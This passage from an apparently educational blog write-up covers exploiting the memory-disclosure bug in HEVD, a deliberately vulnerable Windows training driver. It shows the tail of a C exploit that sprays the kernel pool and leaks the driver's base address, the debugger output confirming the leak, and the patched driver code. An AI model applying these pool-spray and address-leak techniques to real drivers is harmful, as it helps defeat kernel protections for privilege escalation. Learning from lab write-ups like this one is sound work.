<a id="__codelineno-19-26" name="__codelineno-19-26"></a><span class="w">                </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-19-27" name="__codelineno-19-27"></a><span class="w">                    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">[!] Match from %d to %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">pos_text</span><span class="o">-</span><span class="n">len_search</span><span class="p">,</span><span class="w"> </span><span class="n">pos_text</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-19-28" name="__codelineno-19-28"></a><span class="w">                    </span><span class="n">Match</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TRUE</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-19-29" name="__codelineno-19-29"></a><span class="w">                    </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-19-30" name="__codelineno-19-30"></a><span class="w">                </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-19-31" name="__codelineno-19-31"></a><span class="w">            </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-19-32" name="__codelineno-19-32"></a><span class="w">            </span><span class="k">else</span><span class="w"></span>
<a id="__codelineno-19-33" name="__codelineno-19-33"></a><span class="w">            </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-19-34" name="__codelineno-19-34"></a><span class="w">                </span><span class="n">pos_text</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="n">pos_search</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-19-35" name="__codelineno-19-35"></a><span class="w">                </span><span class="n">pos_search</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-19-36" name="__codelineno-19-36"></a><span class="w">            </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-19-37" name="__codelineno-19-37"></a><span class="w">        </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-19-38" name="__codelineno-19-38"></a>
<a id="__codelineno-19-39" name="__codelineno-19-39"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">Match</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">TRUE</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-19-40" name="__codelineno-19-40"></a><span class="w">        </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-19-41" name="__codelineno-19-41"></a><span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mh">0x270</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-19-42" name="__codelineno-19-42"></a><span class="w">            </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-19-43" name="__codelineno-19-43"></a><span class="w">                </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="o">*</span><span class="n">UOutputBuffer</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-19-44" name="__codelineno-19-44"></a><span class="w">                </span><span class="n">UOutputBuffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">OutputBuffer</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-19-45" name="__codelineno-19-45"></a><span class="w">                </span><span class="c1">//printf(&quot;0x%llx\n&quot;, UOutputBuffer[i]);</span>
<a id="__codelineno-19-46" name="__codelineno-19-46"></a>
<a id="__codelineno-19-47" name="__codelineno-19-47"></a><span class="w">                </span><span class="cm">/* Check if we leaked kernel address */</span><span class="w"></span>
<a id="__codelineno-19-48" name="__codelineno-19-48"></a><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">UOutputBuffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xfffff00000000000</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mh">0xfffff00000000000</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-19-49" name="__codelineno-19-49"></a><span class="w">                </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-19-50" name="__codelineno-19-50"></a><span class="w">                    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">[+] Address of HEVD!UaFObjectCallback: 0x%llx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">UOutputBuffer</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span><span class="w"></span>
<a id="__codelineno-19-51" name="__codelineno-19-51"></a><span class="w">                    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">[+] Base Address of HEVD: 0x%llx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">UOutputBuffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mh">0x880C0</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-19-52" name="__codelineno-19-52"></a>
<a id="__codelineno-19-53" name="__codelineno-19-53"></a><span class="w">                    </span><span class="c1">// 0: kd&gt; ? 0xfffff8051b3880c0 - HEVD</span>
<a id="__codelineno-19-54" name="__codelineno-19-54"></a><span class="w">                    </span><span class="c1">// Evaluate expression: 557248 = 00000000`000880c0</span>
<a id="__codelineno-19-55" name="__codelineno-19-55"></a><span class="w">                    </span><span class="n">HevdBaseAddress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UOutputBuffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x880C0</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-19-56" name="__codelineno-19-56"></a><span class="w">                    </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-19-57" name="__codelineno-19-57"></a><span class="w">                </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-19-58" name="__codelineno-19-58"></a><span class="w">            </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-19-59" name="__codelineno-19-59"></a><span class="w">            </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-19-60" name="__codelineno-19-60"></a><span class="w">        </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-19-61" name="__codelineno-19-61"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-19-62" name="__codelineno-19-62"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] Closing handle!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-19-63" name="__codelineno-19-63"></a><span class="w">    </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">DriverHandle</span><span class="p">);</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<p>The code probably looks quite daunting so I'll do my best to explain it. From a high level it is quite simple. We spray the pool with 100 of the vulnerable chunks that we're able to perform the out-of-bounds read with. We'll then iterate over the received buffer and search for the string "Hack", if we find this string then we'll loop over all of the characters in the array and we'll check if they are compliant with the kernel address format, if they are since the pool tag was found we can be sure that we found the an address inside <abbr title="HackSys Extreme Vulnerable Driver">HEVD</abbr> and we can then calculate the base address.</p>
<p>If you're unfamiliar with C I would suggest taking a great deal of care to read over the code and understand what exactly we're doing. Or you could just use Python because it has the <code>in()</code> function which is much easier... If you're really stuck with understanding the above code specifically iterating over the character array, I got most of that from <a href="https://stackoverflow.com/questions/13450809/how-to-search-a-string-in-a-char-array-in-c">this stackoverflow post</a>.</p>
<h2 id="final-result">Final Result<a class="headerlink" href="#final-result" title="Permanent link">&para;</a></h2>
<p>As you can see in the above code block all our effort paid off and we're now able to leak the base address of <abbr title="HackSys Extreme Vulnerable Driver">HEVD</abbr>. It is worth noting that it won't leak every time, you may have to run the code more than once. This could easily be solved by changing the loop logic but I won't bother with that in this post. 90% of the time you'll get the base address within 1 or 2 executions of the exploit.</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-20-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-20-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-20-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-20-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-20-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-20-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-20-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-20-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-20-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-20-10">10</a></span>
<span class="normal"><a href="#__codelineno-20-11">11</a></span>
<span class="normal"><a href="#__codelineno-20-12">12</a></span>
<span class="normal"><a href="#__codelineno-20-13">13</a></span>
<span class="normal"><a href="#__codelineno-20-14">14</a></span>
<span class="normal"><a href="#__codelineno-20-15">15</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1"></a>0: kd&gt; lm m hevd
<a id="__codelineno-20-2" name="__codelineno-20-2"></a>Browse full module list
<a id="__codelineno-20-3" name="__codelineno-20-3"></a>start             end                 module name
<a id="__codelineno-20-4" name="__codelineno-20-4"></a>fffff800`c46e0000 fffff800`c476c000   HEVD       (deferred)             
<a id="__codelineno-20-5" name="__codelineno-20-5"></a>
<a id="__codelineno-20-6" name="__codelineno-20-6"></a>Unable to enumerate user-mode unloaded modules, Win32 error 0n30
<a id="__codelineno-20-7" name="__codelineno-20-7"></a>
<a id="__codelineno-20-8" name="__codelineno-20-8"></a>C:\Users\admin\Desktop&gt;NonPagedPoolNxMemoryDisclosure.exe
<a id="__codelineno-20-9" name="__codelineno-20-9"></a>[+] HEVD: NonPagedPoolNx Memory Disclosure!
<a id="__codelineno-20-10" name="__codelineno-20-10"></a>[*] Opening handle to the driver!
<a id="__codelineno-20-11" name="__codelineno-20-11"></a>        [+] Opened Driver Handle: 0x80
<a id="__codelineno-20-12" name="__codelineno-20-12"></a>[+] Starting pool spray!
<a id="__codelineno-20-13" name="__codelineno-20-13"></a>    [!] Match from 515 to 519
<a id="__codelineno-20-14" name="__codelineno-20-14"></a>    [+] Address of HEVD!UaFObjectCallback: 0xfffff800c47680c0
<a id="__codelineno-20-15" name="__codelineno-20-15"></a>    [+] Base Address of HEVD: 0xfffff800c46e0000
</code></pre></div></td></tr></table></div>
<hr>

<h1 id="fix">Fix<a class="headerlink" href="#fix" title="Permanent link">&para;</a></h1>
<p>Fixing the vulnerability is pretty simple. Instead of doing a read with the size specified by the user, the read is instead done with the size which is specified for the allocation itself. That way the read is only ever the same size as the allocated chunk. Below is a cleaned up output of the fixed version from the <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/MemoryDisclosureNonPagedPoolNx.c"><abbr title="HackSys Extreme Vulnerable Driver">HEVD</abbr> source</a>.</p>
<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Patched Vulnerability</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-21-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-21-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-21-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-21-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-21-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-21-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-21-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-21-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-21-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-21-10">10</a></span>
<span class="normal"><a href="#__codelineno-21-11">11</a></span>
<span class="normal"><a href="#__codelineno-21-12">12</a></span>
<span class="normal"><a href="#__codelineno-21-13">13</a></span>
<span class="normal"><a href="#__codelineno-21-14">14</a></span>
<span class="normal"><a href="#__codelineno-21-15">15</a></span>
<span class="normal"><a href="#__codelineno-21-16">16</a></span>
<span class="normal"><a href="#__codelineno-21-17">17</a></span>
<span class="normal"><a href="#__codelineno-21-18">18</a></span>
<span class="normal"><a href="#__codelineno-21-19">19</a></span>
<span class="normal"><a href="#__codelineno-21-20">20</a></span>
<span class="normal"><a href="#__codelineno-21-21">21</a></span>
<span class="normal"><a href="#__codelineno-21-22">22</a></span>
<span class="normal"><a href="#__codelineno-21-23">23</a></span>
<span class="normal"><a href="#__codelineno-21-24">24</a></span>
<span class="normal"><a href="#__codelineno-21-25">25</a></span>
<span class="normal"><a href="#__codelineno-21-26">26</a></span>
<span class="normal"><a href="#__codelineno-21-27">27</a></span>
<span class="normal"><a href="#__codelineno-21-28">28</a></span>
<span class="normal"><a href="#__codelineno-21-29">29</a></span>
<span class="normal"><a href="#__codelineno-21-30">30</a></span>
<span class="normal"><a href="#__codelineno-21-31">31</a></span>
<span class="normal"><a href="#__codelineno-21-32">32</a></span>
<span class="normal"><a href="#__codelineno-21-33">33</a></span>
<span class="normal"><a href="#__codelineno-21-34">34</a></span>
<span class="normal"><a href="#__codelineno-21-35">35</a></span>
<span class="normal"><a href="#__codelineno-21-36">36</a></span>
<span class="normal"><a href="#__codelineno-21-37">37</a></span>
<span class="normal"><a href="#__codelineno-21-38">38</a></span>
<span class="normal"><a href="#__codelineno-21-39">39</a></span>
<span class="normal"><a href="#__codelineno-21-40">40</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1"></a><span class="w">        </span><span class="n">DbgPrint</span><span class="p">(</span><span class="s">&quot;[+] Allocating Pool chunk</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-21-2" name="__codelineno-21-2"></a>
<a id="__codelineno-21-3" name="__codelineno-21-3"></a><span class="w">        </span><span class="n">KernelBuffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ExAllocatePoolWithTag</span><span class="p">(</span><span class="w"></span>
<a id="__codelineno-21-4" name="__codelineno-21-4"></a><span class="w">            </span><span class="n">NonPagedPoolNx</span><span class="p">,</span><span class="w"></span>
<a id="__codelineno-21-5" name="__codelineno-21-5"></a><span class="w">            </span><span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">POOL_BUFFER_SIZE</span><span class="p">,</span><span class="w"></span>
<a id="__codelineno-21-6" name="__codelineno-21-6"></a><span class="w">            </span><span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="n">POOL_TAG</span><span class="w"></span>
<a id="__codelineno-21-7" name="__codelineno-21-7"></a><span class="w">        </span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-21-8" name="__codelineno-21-8"></a>
<a id="__codelineno-21-9" name="__codelineno-21-9"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">KernelBuffer</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-21-10" name="__codelineno-21-10"></a><span class="w">        </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-21-11" name="__codelineno-21-11"></a><span class="w">            </span><span class="c1">//</span>
<a id="__codelineno-21-12" name="__codelineno-21-12"></a><span class="w">            </span><span class="c1">// Unable to allocate Pool chunk</span>
<a id="__codelineno-21-13" name="__codelineno-21-13"></a><span class="w">            </span><span class="c1">//</span>
<a id="__codelineno-21-14" name="__codelineno-21-14"></a><span class="w">            </span><span class="n">DbgPrint</span><span class="p">(</span><span class="s">&quot;[-] Unable to allocate Pool chunk</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-21-15" name="__codelineno-21-15"></a>
<a id="__codelineno-21-16" name="__codelineno-21-16"></a><span class="w">            </span><span class="n">Status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">STATUS_NO_MEMORY</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-21-17" name="__codelineno-21-17"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">Status</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-21-18" name="__codelineno-21-18"></a><span class="w">        </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-21-19" name="__codelineno-21-19"></a><span class="w">        </span><span class="k">else</span><span class="w"></span>
<a id="__codelineno-21-20" name="__codelineno-21-20"></a><span class="w">        </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-21-21" name="__codelineno-21-21"></a><span class="w">            </span><span class="n">DbgPrint</span><span class="p">(</span><span class="s">&quot;[+] Pool Tag: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">STRINGIFY</span><span class="p">(</span><span class="n">POOL_TAG</span><span class="p">));</span><span class="w"></span>
<a id="__codelineno-21-22" name="__codelineno-21-22"></a><span class="w">            </span><span class="n">DbgPrint</span><span class="p">(</span><span class="s">&quot;[+] Pool Type: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">STRINGIFY</span><span class="p">(</span><span class="n">NonPagedPoolNx</span><span class="p">));</span><span class="w"></span>
<a id="__codelineno-21-23" name="__codelineno-21-23"></a><span class="w">            </span><span class="n">DbgPrint</span><span class="p">(</span><span class="s">&quot;[+] Pool Size: 0x%zX</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">POOL_BUFFER_SIZE</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-21-24" name="__codelineno-21-24"></a><span class="w">            </span><span class="n">DbgPrint</span><span class="p">(</span><span class="s">&quot;[+] Pool Chunk: 0x%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">KernelBuffer</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-21-25" name="__codelineno-21-25"></a><span class="w">        </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-21-26" name="__codelineno-21-26"></a>
<a id="__codelineno-21-27" name="__codelineno-21-27"></a><span class="w">        </span><span class="n">RtlFillMemory</span><span class="p">(</span><span class="n">KernelBuffer</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">POOL_BUFFER_SIZE</span><span class="p">,</span><span class="w"> </span><span class="mh">0x41</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-21-28" name="__codelineno-21-28"></a>
<a id="__codelineno-21-29" name="__codelineno-21-29"></a><span class="w">        </span><span class="n">ProbeForWrite</span><span class="p">(</span><span class="n">UserOutputBuffer</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">POOL_BUFFER_SIZE</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="n">__alignof</span><span class="p">(</span><span class="n">UCHAR</span><span class="p">));</span><span class="w"></span>
<a id="__codelineno-21-30" name="__codelineno-21-30"></a>
<a id="__codelineno-21-31" name="__codelineno-21-31"></a><span class="w">        </span><span class="n">DbgPrint</span><span class="p">(</span><span class="s">&quot;[+] UserOutputBuffer: 0x%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">UserOutputBuffer</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-21-32" name="__codelineno-21-32"></a><span class="w">        </span><span class="n">DbgPrint</span><span class="p">(</span><span class="s">&quot;[+] UserOutputBuffer Size: 0x%zX</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">Size</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-21-33" name="__codelineno-21-33"></a><span class="w">        </span><span class="n">DbgPrint</span><span class="p">(</span><span class="s">&quot;[+] KernelBuffer: 0x%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">KernelBuffer</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-21-34" name="__codelineno-21-34"></a><span class="w">        </span><span class="n">DbgPrint</span><span class="p">(</span><span class="s">&quot;[+] KernelBuffer Size: 0x%zX</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">POOL_BUFFER_SIZE</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-21-35" name="__codelineno-21-35"></a>
<a id="__codelineno-21-36" name="__codelineno-21-36"></a><span class="w">        </span><span class="c1">// Secure Note: This is secure because the developer is passing a size</span>
<a id="__codelineno-21-37" name="__codelineno-21-37"></a><span class="w">        </span><span class="c1">// equal to size of the allocated Pool chunk to RtlCopyMemory()/memcpy().</span>
<a id="__codelineno-21-38" name="__codelineno-21-38"></a><span class="w">        </span><span class="c1">// Hence, there will be no out of bound read of kernel mode memory</span>
<a id="__codelineno-21-39" name="__codelineno-21-39"></a>
<a id="__codelineno-21-40" name="__codelineno-21-40"></a><span class="w">        </span><span class="n">RtlCopyMemory</span><span class="p">(</span><span class="n">UserOutputBuffer</span><span class="p">,</span><span class="w"> </span><span class="n">KernelBuffer</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">POOL_BUFFER_SIZE</span><span class="p">);</span><span class="w"> </span><span class="c1">// (1)</span>
</code></pre></div></td></tr></table></div>
<ol>
<li>The copy here uses the size of the allocated pool buffer, not a size specified from user-mode.</li>
</ol>
<hr>

<h1 id="full-exploit">Full Exploit<a class="headerlink" href="#full-exploit" title="Permanent link">&para;</a></h1>
<p>Thanks for reading, I hope you enjoyed! You can find my full proof of concept below.</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-22-1">  1</a></span>
<span class="normal"><a href="#__codelineno-22-2">  2</a></span>
<span class="normal"><a href="#__codelineno-22-3">  3</a></span>
<span class="normal"><a href="#__codelineno-22-4">  4</a></span>
<span class="normal"><a href="#__codelineno-22-5">  5</a></span>
<span class="normal"><a href="#__codelineno-22-6">  6</a></span>
<span class="normal"><a href="#__codelineno-22-7">  7</a></span>
<span class="normal"><a href="#__codelineno-22-8">  8</a></span>
<span class="normal"><a href="#__codelineno-22-9">  9</a></span>
<span class="normal"><a href="#__codelineno-22-10"> 10</a></span>
<span class="normal"><a href="#__codelineno-22-11"> 11</a></span>
<span class="normal"><a href="#__codelineno-22-12"> 12</a></span>
<span class="normal"><a href="#__codelineno-22-13"> 13</a></span>
<span class="normal"><a href="#__codelineno-22-14"> 14</a></span>
<span class="normal"><a href="#__codelineno-22-15"> 15</a></span>
<span class="normal"><a href="#__codelineno-22-16"> 16</a></span>
<span class="normal"><a href="#__codelineno-22-17"> 17</a></span>
<span class="normal"><a href="#__codelineno-22-18"> 18</a></span>
<span class="normal"><a href="#__codelineno-22-19"> 19</a></span>
<span class="normal"><a href="#__codelineno-22-20"> 20</a></span>
<span class="normal"><a href="#__codelineno-22-21"> 21</a></span>
<span class="normal"><a href="#__codelineno-22-22"> 22</a></span>
<span class="normal"><a href="#__codelineno-22-23"> 23</a></span>
<span class="normal"><a href="#__codelineno-22-24"> 24</a></span>
<span class="normal"><a href="#__codelineno-22-25"> 25</a></span>
<span class="normal"><a href="#__codelineno-22-26"> 26</a></span>
<span class="normal"><a href="#__codelineno-22-27"> 27</a></span>
<span class="normal"><a href="#__codelineno-22-28"> 28</a></span>
<span class="normal"><a href="#__codelineno-22-29"> 29</a></span>
<span class="normal"><a href="#__codelineno-22-30"> 30</a></span>
<span class="normal"><a href="#__codelineno-22-31"> 31</a></span>
<span class="normal"><a href="#__codelineno-22-32"> 32</a></span>
<span class="normal"><a href="#__codelineno-22-33"> 33</a></span>
<span class="normal"><a href="#__codelineno-22-34"> 34</a></span>
<span class="normal"><a href="#__codelineno-22-35"> 35</a></span>
<span class="normal"><a href="#__codelineno-22-36"> 36</a></span>
<span class="normal"><a href="#__codelineno-22-37"> 37</a></span>
<span class="normal"><a href="#__codelineno-22-38"> 38</a></span>
<span class="normal"><a href="#__codelineno-22-39"> 39</a></span>
<span class="normal"><a href="#__codelineno-22-40"> 40</a></span>
<span class="normal"><a href="#__codelineno-22-41"> 41</a></span>
<span class="normal"><a href="#__codelineno-22-42"> 42</a></span>
<span class="normal"><a href="#__codelineno-22-43"> 43</a></span>
<span class="normal"><a href="#__codelineno-22-44"> 44</a></span>
<span class="normal"><a href="#__codelineno-22-45"> 45</a></span>
<span class="normal"><a href="#__codelineno-22-46"> 46</a></span>
<span class="normal"><a href="#__codelineno-22-47"> 47</a></span>
<span class="normal"><a href="#__codelineno-22-48"> 48</a></span>
<span class="normal"><a href="#__codelineno-22-49"> 49</a></span>
<span class="normal"><a href="#__codelineno-22-50"> 50</a></span>
<span class="normal"><a href="#__codelineno-22-51"> 51</a></span>
<span class="normal"><a href="#__codelineno-22-52"> 52</a></span>
<span class="normal"><a href="#__codelineno-22-53"> 53</a></span>
<span class="normal"><a href="#__codelineno-22-54"> 54</a></span>
<span class="normal"><a href="#__codelineno-22-55"> 55</a></span>
<span class="normal"><a href="#__codelineno-22-56"> 56</a></span>
<span class="normal"><a href="#__codelineno-22-57"> 57</a></span>
<span class="normal"><a href="#__codelineno-22-58"> 58</a></span>
<span class="normal"><a href="#__codelineno-22-59"> 59</a></span>
<span class="normal"><a href="#__codelineno-22-60"> 60</a></span>
<span class="normal"><a href="#__codelineno-22-61"> 61</a></span>
<span class="normal"><a href="#__codelineno-22-62"> 62</a></span>
<span class="normal"><a href="#__codelineno-22-63"> 63</a></span>
<span class="normal"><a href="#__codelineno-22-64"> 64</a></span>
<span class="normal"><a href="#__codelineno-22-65"> 65</a></span>
<span class="normal"><a href="#__codelineno-22-66"> 66</a></span>
<span class="normal"><a href="#__codelineno-22-67"> 67</a></span>
<span class="normal"><a href="#__codelineno-22-68"> 68</a></span>
<span class="normal"><a href="#__codelineno-22-69"> 69</a></span>
<span class="normal"><a href="#__codelineno-22-70"> 70</a></span>
<span class="normal"><a href="#__codelineno-22-71"> 71</a></span>
<span class="normal"><a href="#__codelineno-22-72"> 72</a></span>
<span class="normal"><a href="#__codelineno-22-73"> 73</a></span>
<span class="normal"><a href="#__codelineno-22-74"> 74</a></span>
<span class="normal"><a href="#__codelineno-22-75"> 75</a></span>
<span class="normal"><a href="#__codelineno-22-76"> 76</a></span>
<span class="normal"><a href="#__codelineno-22-77"> 77</a></span>
<span class="normal"><a href="#__codelineno-22-78"> 78</a></span>
<span class="normal"><a href="#__codelineno-22-79"> 79</a></span>
<span class="normal"><a href="#__codelineno-22-80"> 80</a></span>
<span class="normal"><a href="#__codelineno-22-81"> 81</a></span>
<span class="normal"><a href="#__codelineno-22-82"> 82</a></span>
<span class="normal"><a href="#__codelineno-22-83"> 83</a></span>
<span class="normal"><a href="#__codelineno-22-84"> 84</a></span>
<span class="normal"><a href="#__codelineno-22-85"> 85</a></span>
<span class="normal"><a href="#__codelineno-22-86"> 86</a></span>
<span class="normal"><a href="#__codelineno-22-87"> 87</a></span>
<span class="normal"><a href="#__codelineno-22-88"> 88</a></span>
<span class="normal"><a href="#__codelineno-22-89"> 89</a></span>
<span class="normal"><a href="#__codelineno-22-90"> 90</a></span>
<span class="normal"><a href="#__codelineno-22-91"> 91</a></span>
<span class="normal"><a href="#__codelineno-22-92"> 92</a></span>
<span class="normal"><a href="#__codelineno-22-93"> 93</a></span>
<span class="normal"><a href="#__codelineno-22-94"> 94</a></span>
<span class="normal"><a href="#__codelineno-22-95"> 95</a></span>
<span class="normal"><a href="#__codelineno-22-96"> 96</a></span>
<span class="normal"><a href="#__codelineno-22-97"> 97</a></span>
<span class="normal"><a href="#__codelineno-22-98"> 98</a></span>
<span class="normal"><a href="#__codelineno-22-99"> 99</a></span>
<span class="normal"><a href="#__codelineno-22-100">100</a></span>
<span class="normal"><a href="#__codelineno-22-101">101</a></span>
<span class="normal"><a href="#__codelineno-22-102">102</a></span>
<span class="normal"><a href="#__codelineno-22-103">103</a></span>
<span class="normal"><a href="#__codelineno-22-104">104</a></span>
<span class="normal"><a href="#__codelineno-22-105">105</a></span>
<span class="normal"><a href="#__codelineno-22-106">106</a></span>
<span class="normal"><a href="#__codelineno-22-107">107</a></span>
<span class="normal"><a href="#__codelineno-22-108">108</a></span>
<span class="normal"><a href="#__codelineno-22-109">109</a></span>
<span class="normal"><a href="#__codelineno-22-110">110</a></span>
<span class="normal"><a href="#__codelineno-22-111">111</a></span>
<span class="normal"><a href="#__codelineno-22-112">112</a></span>
<span class="normal"><a href="#__codelineno-22-113">113</a></span>
<span class="normal"><a href="#__codelineno-22-114">114</a></span>
<span class="normal"><a href="#__codelineno-22-115">115</a></span>
<span class="normal"><a href="#__codelineno-22-116">116</a></span>
<span class="normal"><a href="#__codelineno-22-117">117</a></span>
<span class="normal"><a href="#__codelineno-22-118">118</a></span>
<span class="normal"><a href="#__codelineno-22-119">119</a></span>
<span class="normal"><a href="#__codelineno-22-120">120</a></span>
